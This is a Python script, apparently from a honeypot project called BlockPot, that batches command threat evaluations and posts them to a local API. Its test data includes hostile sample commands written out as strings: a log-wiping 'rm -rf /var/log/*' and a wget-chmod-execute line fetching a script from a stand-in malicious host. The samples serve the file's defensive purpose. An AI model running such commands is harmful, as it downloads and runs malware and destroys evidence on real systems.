import requests
import json
import time
import os
import sys
import logging
import argparse
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("blockpot_sender.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("BlockPot-Sender")

class BlockPotBackendSender:
    """Sends threat evaluation results to the Flask API backend"""
    
    def __init__(self, api_url="http://localhost:5000/api", api_key=None, batch_size=10, retry_delay=5):
        """
        Initialize the sender
        
        Args:
            api_url: URL of the BlockPot API
            api_key: API key for authentication
            batch_size: Number of records to send in a batch
            retry_delay: Delay between retries in seconds
        """
        self.api_url = api_url
        self.api_key = api_key or os.environ.get("BLOCKPOT_API_KEY", "")
        self.batch_size = batch_size
        self.retry_delay = retry_delay
        self.buffer = []
        self.last_send_time = datetime.now()
    
    def send_evaluation(self, evaluation_result):
        """
        Send a single evaluation result to the API
        
        Args:
            evaluation_result: Dict containing the evaluation result
            
        Returns:
            Boolean indicating success
        """
        # Add to buffer
        self.buffer.append(evaluation_result)
        
        # Send immediately if buffer reaches batch size
        if len(self.buffer) >= self.batch_size:
            return self.send_batch()
        
        # Send if it's been more than 10 seconds since last send
        time_since_last = (datetime.now() - self.last_send_time).total_seconds()
        if time_since_last > 10 and len(self.buffer) > 0:
            return self.send_batch()
            
        return True
    
    def send_batch(self):
        """
        Send all buffered evaluation results as a batch
        
        Returns:
            Boolean indicating success
        """
        if not self.buffer:
            return True
            
        try:
            # Prepare request
            headers = {
                "Content-Type": "application/json",
                "X-API-Key": self.api_key
            }
            
            # Send the batch to the API
            response = requests.post(
                f"{self.api_url}/command-logs/batch",
                headers=headers,
                json={"evaluations": self.buffer}
            )
            
            # Check if request was successful
            if response.status_code == 200:
                logger.info(f"Successfully sent {len(self.buffer)} evaluations to API")
                self.buffer = []  # Clear buffer on success
                self.last_send_time = datetime.now()
                return True
            else:
                logger.error(f"Failed to send evaluations: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            logger.error(f"Error sending evaluations to API: {e}")
            # Retry mechanism
            logger.info(f"Retrying in {self.retry_delay} seconds...")
            time.sleep(self.retry_delay)
            # Reduce buffer size by half if it gets too large to prevent memory issues
            if len(self.buffer) > 100:
                self.buffer = self.buffer[-50:]
                logger.warning("Buffer too large, truncated to last 50 records")
            return False
    
    def flush(self):
        """
        Force send all buffered evaluations
        
        Returns:
            Boolean indicating success
        """
        if not self.buffer:
            return True
            
        logger.info(f"Flushing {len(self.buffer)} evaluations to API")
        return self.send_batch()

def main():
    """Main function for running the sender as a standalone script"""
    parser = argparse.ArgumentParser(description="BlockPot Backend Sender")
    parser.add_argument("--api-url", default="http://localhost:5000/api", help="API URL")
    parser.add_argument("--api-key", help="API key")
    parser.add_argument("--batch-size", type=int, default=10, help="Batch size")
    parser.add_argument("--test", action="store_true", help="Send test data")
    args = parser.parse_args()
    
    sender = BlockPotBackendSender(
        api_url=args.api_url,
        api_key=args.api_key,
        batch_size=args.batch_size
    )
    
    if args.test:
        # Generate test data
        test_evaluations = [
            {
                "command": "ls -la",
                "timestamp": datetime.now().isoformat(),
                "src_ip": "192.168.1.100",
                "session": "test-session-1",
                "username": "user1",
                "classification": {
                    "threat_level": "safe",
                    "confidence": 0.95,
                    "probabilities": {"safe": 0.95, "suspicious": 0.04, "malicious": 0.01}
                },
                "nlp_analysis": {
                    "risk_score": 1.2,
                    "intent": "list_files",
                    "actions": ["list", "show_hidden"]
                },
                "blockchain_hash": "0x123456789abcdef"
            },
            {
                "command": "rm -rf /var/log/*",
                "timestamp": datetime.now().isoformat(),
                "src_ip": "10.0.0.5",
                "session": "test-session-2",
                "username": "attacker",
                "classification": {
                    "threat_level": "suspicious",
                    "confidence": 0.87,
                    "probabilities": {"safe": 0.01, "suspicious": 0.87, "malicious": 0.12}
                },
                "nlp_analysis": {
                    "risk_score": 6.7,
                    "intent": "delete_logs",
                    "actions": ["delete", "recursive", "logs"]
                },
                "blockchain_hash": "0xabcdef123456789"
            },
            {
                "command": "wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh",
                "timestamp": datetime.now().isoformat(),
                "src_ip": "45.33.22.11",
                "session": "test-session-3",
                "username": "root",
                "classification": {
                    "threat_level": "malicious",
                    "confidence": 0.99,
                    "probabilities": {"safe": 0.0, "suspicious": 0.01, "malicious": 0.99}
                },
                "nlp_analysis": {
                    "risk_score": 9.8,
                    "intent": "download_execute_malware",
                    "actions": ["download", "make_executable", "execute"]
                },
                "blockchain_hash": "0x9876543210abcdef"
            }
        ]
        
        # Send test evaluations
        for eval_result in test_evaluations:
            sender.send_evaluation(eval_result)
            time.sleep(1)  # Add delay between test sends
            
        # Make sure all evaluations are sent
        sender.flush()
        logger.info("Test evaluations sent successfully")
    else:
        logger.info("Running in standby mode. Use this script as a module in your main application.")

if __name__ == "__main__":
    main()
    